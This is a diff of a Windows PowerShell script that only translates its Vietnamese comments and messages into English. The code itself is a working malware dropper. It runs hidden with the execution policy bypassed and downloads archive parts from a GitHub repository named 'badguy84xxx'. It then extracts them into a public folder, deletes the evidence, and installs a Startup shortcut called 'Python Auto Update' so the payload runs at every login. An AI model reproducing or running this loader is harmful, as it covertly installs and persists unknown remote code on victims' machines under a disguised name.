@@ -1,5 +1,5 @@
 cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"
-# Định nghĩa URL và đường dẫn tải xuống
+# Define URLs and download paths
 $urls = @(
     "https://github.com/badguy84xxx/back/raw/refs/heads/main/Backup.zip.001",
     "https://github.com/badguy84xxx/back/raw/refs/heads/main/Backup.zip.002",
@@ -10,74 +10,74 @@ $outputDir = Join-Path -Path $publicDir -ChildPath "Python"
 $downloadedFiles = @()
 $outputFile = Join-Path -Path $publicDir -ChildPath "Backup.zip"
 
-# Tạo thư mục đích nếu chưa tồn tại
+# Create destination directory if it doesn't exist
 if (!(Test-Path -Path $outputDir)) {
     New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
 }
 
-# Tải xuống tất cả các tệp
+# Download all files
 foreach ($url in $urls) {
-    # Tên tệp từ URL
+    # Extract file name from URL
     $fileName = [System.IO.Path]::GetFileName($url)
     $filePath = Join-Path -Path $publicDir -ChildPath $fileName
 
-    # Tải xuống tệp
+    # Download file
     $webClient = New-Object System.Net.WebClient
     $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
     try {
         $webClient.DownloadFile($url, $filePath)
-        Write-Output "Tải xuống thành công: $filePath"
-        $downloadedFiles += $filePath # Ghi nhận tệp đã tải xuống
+        Write-Output "Downloaded successfully: $filePath"
+        $downloadedFiles += $filePath # Record downloaded file
     } catch {
-        Write-Output "Lỗi khi tải xuống: $url"
-        Write-Output "Chi tiết lỗi: $_"
+        Write-Output "Error downloading: $url"
+        Write-Output "Error details: $_"
         continue
     }
 }
 
-# Ghép các tệp .001, .002, .003 thành Backup.zip
+# Merge .001, .002, .003 files into Backup.zip
 try {
     Get-Content -Path ($downloadedFiles | Sort-Object) -Encoding Byte -ReadCount 0 |
         Set-Content -Path $outputFile -Encoding Byte
-    Write-Output "Ghép tệp thành công: $outputFile"
+    Write-Output "Files merged successfully: $outputFile"
 } catch {
-    Write-Output "Lỗi trong quá trình ghép tệp: $_"
+    Write-Output "Error during file merge: $_"
     exit
 }
 
-# Giải nén tệp ZIP
+# Extract ZIP file
 if (Test-Path -Path $outputFile) {
     try {
         Add-Type -AssemblyName System.IO.Compression.FileSystem
         [System.IO.Compression.ZipFile]::ExtractToDirectory($outputFile, $outputDir)
-        Write-Output "Giải nén hoàn tất: $outputFile vào $outputDir"
+        Write-Output "Extraction completed: $outputFile to $outputDir"
 
-        # Xóa tệp ZIP và các tệp nhỏ đã tải xuống
+        # Delete ZIP file and downloaded parts
         Remove-Item -Path $outputFile -Force
-        Write-Output "Đã xóa tệp ZIP: $outputFile"
+        Write-Output "Deleted ZIP file: $outputFile"
 
         foreach ($file in $downloadedFiles) {
             Remove-Item -Path $file -Force
-            Write-Output "Đã xóa tệp nhỏ: $file"
+            Write-Output "Deleted part file: $file"
         }
     } catch {
-        Write-Output "Lỗi trong quá trình giải nén: $_"
+        Write-Output "Error during extraction: $_"
     }
 } else {
-    Write-Output "Tệp ZIP không tồn tại hoặc ghép không thành công: $outputFile"
+    Write-Output "ZIP file not found or merge failed: $outputFile"
 }
 
-# Tạo Shortcut của Python.vbs trong thư mục Startup
+# Create Shortcut for Python.vbs in Startup folder
 $TargetFile = "C:\Users\Public\Python\Python.vbs"
 $ShortcutName = "Python Auto Update.lnk"
 $StartupFolder = "$([Environment]::GetFolderPath('Startup'))"
 $ShortcutPath = Join-Path -Path $StartupFolder -ChildPath $ShortcutName
 
 try {
-    # Tạo đối tượng WScript.Shell
+    # Create WScript.Shell object
     $Shell = New-Object -ComObject WScript.Shell
 
-    # Tạo Shortcut
+    # Create Shortcut
     $Shortcut = $Shell.CreateShortcut($ShortcutPath)
     $Shortcut.TargetPath = $TargetFile
     $Shortcut.WorkingDirectory = (Split-Path -Path $TargetFile)
@@ -85,9 +85,9 @@ try {
 
     Write-Host "Shortcut created at $ShortcutPath"
 
-    # Thực thi Shortcut
+    # Execute Shortcut
     Start-Process -FilePath $ShortcutPath
-    Write-Output "Đã thực thi Shortcut: $ShortcutPath"
+    Write-Output "Shortcut executed: $ShortcutPath"
 } catch {
-    Write-Output "Lỗi khi tạo hoặc thực thi Shortcut: $_"
+    Write-Output "Error creating or executing Shortcut: $_"
 }
